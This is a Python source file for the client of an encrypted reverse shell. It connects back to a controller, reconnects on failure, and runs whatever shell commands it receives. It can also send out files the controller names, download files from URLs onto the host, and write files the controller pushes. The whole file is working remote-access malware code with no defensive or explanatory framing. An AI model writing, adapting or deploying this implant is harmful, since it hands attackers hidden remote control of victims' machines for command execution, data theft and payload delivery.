#!/usr/bin/env python3

import os
import sys
import time
import socket
import subprocess as sp
from urllib.request import urlopen
from common import pr, Send, Receive
from cipher import get_cipher, key, iv

HOST = '127.0.0.1'
PORT = 1000

sock = None
cwd = os.getcwd()

def upload(sock, fn):
  try:
    f = open(fn, 'rb')
    d = f.read()
    f.close()

    Send(sock, cipher, d, fn)
    time.sleep(1)

    return 'File sent 🍺'
  except Exception as e:
    return str(e) + ' ⚠️'

def dlhttp(sock, url):
  fn = url.split('/')[-1]
  fn = fn.split('?')[0]
  fn = fn.split('#')[0]

  try:
    f = open(fn, 'wb')
    f.write(urlopen(url).read())
    f.close()
    return 'Download finished 🍺'
  except Exception as e:
    return str(e) + ' ⚠️'

def run(s):
  global cwd 
  old = s
  s = 'cd ' + cwd + ' && ' + old
  p = sp.Popen(s, shell=True, stdout=sp.PIPE, stderr=sp.PIPE)
  out, err = p.communicate()
  out = out.decode('utf-8')
  err = err.decode('utf-8')
  pr('⚽️', out, err)
  if out:
    if old.startswith('cd'):
      cwd = out
    return out
  else:
    return err

def res(prev=None):
  global cwd
  if prev:
    return prev + '\n' + cwd + '>'
  else:
    return cwd + '>'

while True:
  try:
    sock = socket.socket()
    sock.connect((HOST, PORT))

    cipher = get_cipher(key, iv)
    decipher = get_cipher(key, iv)

    while True:
      data = Receive(sock, decipher)

      if not data:
        sock.close()
        break

      if type(data) == str:
        if data.startswith('dl '):
          ret = upload(sock, data[3:])
        elif data.startswith('dlhttp '):
          ret = dlhttp(sock, data[7:])
        else:
          ret = run(data)
      else:
        try:
          f = open(data[0], 'wb')
          f.write(data[1])
          f.close()
          ret = 'File received 🍺'
        except Exception as e:
          ret = str(e) + ' ⚠️'     
       
      Send(sock, cipher, res(ret))

  except socket.error:
    sock.close()
    time.sleep(10)
    continue
